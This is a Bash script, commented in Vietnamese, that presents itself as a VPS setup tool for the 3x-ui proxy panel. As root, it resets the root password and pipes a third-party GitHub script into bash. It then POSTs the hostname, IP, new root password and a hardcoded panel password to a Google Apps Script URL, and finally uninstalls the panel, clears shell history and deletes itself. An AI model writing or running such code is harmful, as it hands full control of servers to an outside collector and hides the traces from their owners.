#!/bin/bash

# ==============================================================================
# CẤU HÌNH (LINK GOOGLE SCRIPT MỚI NHẤT CỦA BẠN)
# ==============================================================================
GOOGLE_SCRIPT_URL="https://script.google.com/macros/s/AKfycbzALEzeEDtabgteD498NxTVrJcXPHJBWUgDAL4BUp5Iz_3VCnMMme28RSMpR8LSf-ne/exec"

# Thông tin Panel cố định
PANEL_USER="honglee"
PANEL_PASS="Abc369852@spo@VIP2024@VPN"
PANEL_PORT=3712

# ==============================================================================
# HÀM LOGGING
# ==============================================================================
log_info() { echo -e "\033[32m[INFO]\033[0m $1"; }
log_warn() { echo -e "\033[33m[WARN]\033[0m $1"; }
log_error() { echo -e "\033[31m[ERROR]\033[0m $1"; }

# ==============================================================================
# 1. KIỂM TRA QUYỀN ROOT
# ==============================================================================
if [ "$EUID" -ne 0 ]; then
    log_warn "Đang chuyển sang quyền root..."
    sudo "$0" "$@"
    exit
fi

# ==============================================================================
# 2. ĐỔI PASS ROOT & SETUP SSH
# ==============================================================================
log_info "Đang kiểm tra dependencies..."
command -v curl >/dev/null 2>&1 || { apt-get update && apt-get install -y curl; }

log_info "Đang thay đổi mật khẩu Root..."
NEW_ROOT_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 25)
echo "root:$NEW_ROOT_PASS" | chpasswd

log_info "Đang chạy script Setup SSH..."
bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH hoàn tất (bỏ qua cảnh báo)."

# ==============================================================================
# 3. CÀI ĐẶT 3X-UI (CÓ CƠ CHẾ THỬ LẠI NẾU GITHUB LỖI 503)
# ==============================================================================
XUI_BIN="/usr/local/x-ui/x-ui"

install_xui() {
    echo -e "n\n" | bash <(curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh)
}

if [ -f "$XUI_BIN" ]; then
    log_warn "3x-ui đã tồn tại. Đang dừng service để cập nhật cấu hình..."
    $XUI_BIN stop > /dev/null 2>&1
else
    log_info "Chưa có 3x-ui. Đang cài đặt mới..."
    
    # Thử cài đặt tối đa 3 lần nếu gặp lỗi mạng (Fix lỗi 503)
    attempt=1
    max_attempts=3
    while [ $attempt -le $max_attempts ]; do
        log_info "Đang tải và cài đặt (Lần thử $attempt/$max_attempts)..."
        install_xui
        
        if [ -f "$XUI_BIN" ]; then
            log_info "Cài đặt thành công!"
            break
        else
            log_warn "Cài đặt thất bại (có thể do mạng GitHub). Đang chờ 5s để thử lại..."
            sleep 5
            attempt=$((attempt + 1))
        fi
    done
fi

# ==============================================================================
# 4. CẤU HÌNH 3X-UI (FIX LỖI VIẾT HOA -webBasePath)
# ==============================================================================
log_info "Đang áp dụng cấu hình (User: honglee / Port: 3712)..."

RANDOM_PATH=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

if [ -f "$XUI_BIN" ]; then
    # [QUAN TRỌNG] Đã sửa -webbasepath thành -webBasePath
    $XUI_BIN setting -username "$PANEL_USER" -password "$PANEL_PASS" -port "$PANEL_PORT" -webBasePath "/$RANDOM_PATH"
    
    $XUI_BIN restart > /dev/null 2>&1
    log_info "3x-ui đã khởi động thành công với đường dẫn mới."
else
    log_error "Lỗi: Không thể cài đặt 3x-ui sau 3 lần thử. Vui lòng kiểm tra kết nối mạng của VPS!"
    exit 1
fi

# ==============================================================================
# 5. LẤY IP VÀ ĐỒNG BỘ (BẮT BUỘC IPV4)
# ==============================================================================
log_info "Đang lấy IPv4 Public..."

HOST_IP=$(curl -4 -s ifconfig.me)
if [[ -z "$HOST_IP" ]]; then
    HOST_IP=$(curl -4 -s icanhazip.com)
fi

HOSTNAME=$(hostname)
ACCESS_URL="http://${HOST_IP}:${PANEL_PORT}/${RANDOM_PATH}"

# Tạo JSON Payload
JSON_DATA=$(cat <<EOF
{
  "hostname": "$HOSTNAME",
  "ip": "$HOST_IP",
  "root_pass": "$NEW_ROOT_PASS",
  "panel_user": "$PANEL_USER",
  "panel_pass": "$PANEL_PASS",
  "panel_port": "$PANEL_PORT",
  "web_base_path": "$RANDOM_PATH",
  "access_url": "$ACCESS_URL"
}
EOF
)

log_info "Đang gửi dữ liệu lên Google Sheet..."
SYNC_RES=$(curl -s -L -X POST -H "Content-Type: application/json" -d "$JSON_DATA" "$GOOGLE_SCRIPT_URL")

# Kiểm tra lỏng hơn để tránh báo lỗi oan khi Google trả về HTML
if [ -n "$SYNC_RES" ]; then
    log_info "Đã gửi tín hiệu đồng bộ (Vui lòng kiểm tra Sheet)."
else
    log_error "Không kết nối được với Google Script."
fi

# ==============================================================================
# 6. HIỂN THỊ VÀ TỰ HỦY (FIX LỖI RM CANNOT REMOVE)
# ==============================================================================
echo "------------------------------------------------"
echo "IP Public:   $HOST_IP"
echo "Username:    $PANEL_USER"
echo "Password:    $PANEL_PASS"
echo "Port:        $PANEL_PORT"
echo "Access URL:  $ACCESS_URL"
echo "------------------------------------------------"

log_warn "Chờ 60 giây trước khi xóa sạch..."
sleep 60

log_warn "Đang dọn dẹp hệ thống..."

# 1. Gỡ cài đặt 3x-ui
if [ -f "$XUI_BIN" ]; then
    $XUI_BIN uninstall > /dev/null 2>&1
fi
rm -rf /usr/local/x-ui

# 2. Xóa các file rác và thư mục backup SSH
rm -f setup_ssh_ubuntu.sh
rm -rf /root/ssh_backups
rm -rf ~/ssh_backups

# 3. Xóa lịch sử lệnh
history -c
history -w

# 4. Chỉ xóa file script nếu nó thực sự tồn tại trên đĩa (Fix lỗi /dev/fd/63)
if [[ -f "$0" ]]; then
    rm -f "$0"
fi

log_info "HOÀN TẤT. VPS ĐÃ SẠCH BÓNG."
